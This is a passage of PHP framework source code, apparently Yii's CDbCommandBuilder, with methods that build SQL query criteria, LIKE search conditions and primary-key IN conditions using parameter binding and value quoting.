	 * @param string $prefix column prefix (ended with dot). If null, it will be the table name
	 * @return CDbCriteria the created query criteria
	 */
	public function createPkCriteria($table,$pk,$condition='',$params=array(),$prefix=null)
	{
		$this->ensureTable($table);
		$criteria=$this->createCriteria($condition,$params);
		if($criteria->alias!='')
			$prefix=$this->_schema->quoteTableName($criteria->alias).'.';
		if(!is_array($pk)) // single key
			$pk=array($pk);
		if(is_array($table->primaryKey) && !isset($pk[0]) && $pk!==array()) // single composite key
			$pk=array($pk);
		$condition=$this->createInCondition($table,$table->primaryKey,$pk,$prefix);
		if($criteria->condition!='')
			$criteria->condition=$condition.' AND ('.$criteria->condition.')';
		else
			$criteria->condition=$condition;

		return $criteria;
	}

	/**
	 * Generates the expression for selecting rows of specified primary key values.
	 * @param mixed $table the table schema ({@link CDbTableSchema}) or the table name (string).
	 * @param array $values list of primary key values to be selected within
	 * @param string $prefix column prefix (ended with dot). If null, it will be the table name
	 * @return string the expression for selection
	 */
	public function createPkCondition($table,$values,$prefix=null)
	{
		$this->ensureTable($table);
		return $this->createInCondition($table,$table->primaryKey,$values,$prefix);
	}

	/**
	 * Creates a query criteria with the specified column values.
	 * @param mixed $table the table schema ({@link CDbTableSchema}) or the table name (string).
	 * @param array $columns column values that should be matched in the query (name=>value)
	 * @param mixed $condition query condition or criteria.
	 * If a string, it is treated as query condition;
	 * If an array, it is treated as the initial values for constructing a {@link CDbCriteria};
	 * Otherwise, it should be an instance of {@link CDbCriteria}.
	 * @param array $params parameters to be bound to an SQL statement.
	 * This is only used when the third parameter is a string (query condition).
	 * In other cases, please use {@link CDbCriteria::params} to set parameters.
	 * @param string $prefix column prefix (ended with dot). If null, it will be the table name
	 * @throws CDbException if specified column is not found in given table
	 * @return CDbCriteria the created query criteria
	 */
	public function createColumnCriteria($table,$columns,$condition='',$params=array(),$prefix=null)
	{
		$this->ensureTable($table);
		$criteria=$this->createCriteria($condition,$params);
		if($criteria->alias!='')
			$prefix=$this->_schema->quoteTableName($criteria->alias).'.';
		$bindByPosition=isset($criteria->params[0]);
		$conditions=array();
		$values=array();
		$i=0;
		if($prefix===null)
			$prefix=$table->rawName.'.';
		foreach($columns as $name=>$value)
		{
			if(($column=$table->getColumn($name))!==null)
			{
				if(is_array($value))
					$conditions[]=$this->createInCondition($table,$name,$value,$prefix);
				elseif($value!==null)
				{
					if($bindByPosition)
					{
						$conditions[]=$prefix.$column->rawName.'=?';
						$values[]=$value;
					}
					else
					{
						$conditions[]=$prefix.$column->rawName.'='.self::PARAM_PREFIX.$i;
						$values[self::PARAM_PREFIX.$i]=$value;
						$i++;
					}
				}
				else
					$conditions[]=$prefix.$column->rawName.' IS NULL';
			}
			else
				throw new CDbException(Yii::t('yii','Table "{table}" does not have a column named "{column}".',
					array('{table}'=>$table->name,'{column}'=>$name)));
		}
		$criteria->params=array_merge($values,$criteria->params);
		if(isset($conditions[0]))
		{
			if($criteria->condition!='')
				$criteria->condition=implode(' AND ',$conditions).' AND ('.$criteria->condition.')';
			else
				$criteria->condition=implode(' AND ',$conditions);
		}
		return $criteria;
	}

	/**
	 * Generates the expression for searching the specified keywords within a list of columns.
	 * The search expression is generated using the 'LIKE' SQL syntax.
	 * Every word in the keywords must be present and appear in at least one of the columns.
	 * @param mixed $table the table schema ({@link CDbTableSchema}) or the table name (string).
	 * @param array $columns list of column names for potential search condition.
	 * @param mixed $keywords search keywords. This can be either a string with space-separated keywords or an array of keywords.
	 * @param string $prefix optional column prefix (with dot at the end). If null, the table name will be used as the prefix.
	 * @param boolean $caseSensitive whether the search is case-sensitive. Defaults to true.
	 * @throws CDbException if specified column is not found in given table
	 * @return string SQL search condition matching on a set of columns. An empty string is returned
	 * if either the column array or the keywords are empty.
	 */
	public function createSearchCondition($table,$columns,$keywords,$prefix=null,$caseSensitive=true)
	{
		$this->ensureTable($table);
		if(!is_array($keywords))
			$keywords=preg_split('/\s+/u',$keywords,-1,PREG_SPLIT_NO_EMPTY);
		if(empty($keywords))
			return '';
		if($prefix===null)
			$prefix=$table->rawName.'.';
		$conditions=array();
		foreach($columns as $name)
		{
			if(($column=$table->getColumn($name))===null)
				throw new CDbException(Yii::t('yii','Table "{table}" does not have a column named "{column}".',
					array('{table}'=>$table->name,'{column}'=>$name)));
			$condition=array();
			foreach($keywords as $keyword)
			{
				$keyword='%'.strtr($keyword,array('%'=>'\%', '_'=>'\_', '\\'=>'\\\\')).'%';
				if($caseSensitive)
					$condition[]=$prefix.$column->rawName.' LIKE '.$this->_connection->quoteValue($keyword);
				else
					$condition[]='LOWER('.$prefix.$column->rawName.') LIKE LOWER('.$this->_connection->quoteValue($keyword).')';
			}
			$conditions[]=implode(' AND ',$condition);
		}
		return '('.implode(' OR ',$conditions).')';
	}

	/**
	 * Generates the expression for selecting rows of specified primary key values.
	 * @param mixed $table the table schema ({@link CDbTableSchema}) or the table name (string).
	 * @param mixed $columnName the column name(s). It can be either a string indicating a single column
	 * or an array of column names. If the latter, it stands for a composite key.
	 * @param array $values list of key values to be selected within
	 * @param string $prefix column prefix (ended with dot). If null, it will be the table name
	 * @throws CDbException if specified column is not found in given table
	 * @return string the expression for selection
	 */
	public function createInCondition($table,$columnName,$values,$prefix=null)
	{
		if(($n=count($values))<1)
			return '0=1';

		$this->ensureTable($table);

		if($prefix===null)
			$prefix=$table->rawName.'.';

		$db=$this->_connection;

		if(is_array($columnName) && count($columnName)===1)
			$columnName=reset($columnName);

		if(is_string($columnName)) // simple key
		{
			if(!isset($table->columns[$columnName]))
				throw new CDbException(Yii::t('yii','Table "{table}" does not have a column named "{column}".',
				array('{table}'=>$table->name, '{column}'=>$columnName)));
			$column=$table->columns[$columnName];

			$values=array_values($values);
			foreach($values as &$value)
			{
				$value=$column->typecast($value);
				if(is_string($value))
					$value=$db->quoteValue($value);
			}
			if($n===1)
				return $prefix.$column->rawName.($values[0]===null?' IS NULL':'='.$values[0]);
			else
				return $prefix.$column->rawName.' IN ('.implode(', ',$values).')';
		}
		elseif(is_array($columnName)) // composite key: $values=array(array('pk1'=>'v1','pk2'=>'v2'),array(...))
		{
			foreach($columnName as $name)
			{
				if(!isset($table->columns[$name]))
					throw new CDbException(Yii::t('yii','Table "{table}" does not have a column named "{column}".',
					array('{table}'=>$table->name, '{column}'=>$name)));

				for($i=0;$i<$n;++$i)
				{
					if(isset($values[$i][$name]))
					{
						$value=$table->columns[$name]->typecast($values[$i][$name]);
						if(is_string($value))
							$values[$i][$name]=$db->quoteValue($value);
						else
							$values[$i][$name]=$value;
					}
					else
						throw new CDbException(Yii::t('yii','The value for the column "{column}" is not supplied when querying the table "{table}".',
							array('{table}'=>$table->name,'{column}'=>$name)));
				}
			}
			if(count($values)===1)
			{
				$entries=array();
				foreach($values[0] as $name=>$value)
					$entries[]=$prefix.$table->columns[$name]->rawName.($value===null?' IS NULL':'='.$value);
				return implode(' AND ',$entries);
			}

			return $this->createCompositeInCondition($table,$values,$prefix);
		}
		else
			throw new CDbException(Yii::t('yii','Column name must be either a string or an array.'));
	}

	/**
	 * Generates the expression for selecting rows with specified composite key values.
	 * @param CDbTableSchema $table the table schema
	 * @param array $values list of primary key values to be selected within
	 * @param string $prefix column prefix (ended with dot)
	 * @return string the expression for selection
	 */
	protected function createCompositeInCondition($table,$values,$prefix)
	{
		$keyNames=array();
		foreach(array_keys($values[0]) as $name)
			$keyNames[]=$prefix.$table->columns[$name]->rawName;
		$vs=array();
		foreach($values as $value)
			$vs[]='('.implode(', ',$value).')';
		return '('.implode(', ',$keyNames).') IN ('.implode(', ',$vs).')';
	}

	/**
	 * Checks if the parameter is a valid table schema.
	 * If it is a string, the corresponding table schema will be retrieved.
	 * @param mixed $table table schema ({@link CDbTableSchema}) or table name (string).
	 * If this refers to a valid table name, this parameter will be returned with the corresponding table schema.
	 * @throws CDbException if the table name is not valid
	 */
	protected function ensureTable(&$table)
	{
		if(is_string($table) && ($table=$this->_schema->getTable($tableName=$table))===null)
			throw new CDbException(Yii::t('yii','Table "{table}" does not exist.',
				array('{table}'=>$tableName)));
	}

	/**
	 * Returns default value of the integer/serial primary key. Default value means that the next
	 * autoincrement/sequence value would be used.
	 * @return string default value of the integer/serial primary key.
	 * @since 1.1.14
	 */
	protected function getIntegerPrimaryKeyDefaultValue()
	{
		return 'NULL';
	}
}
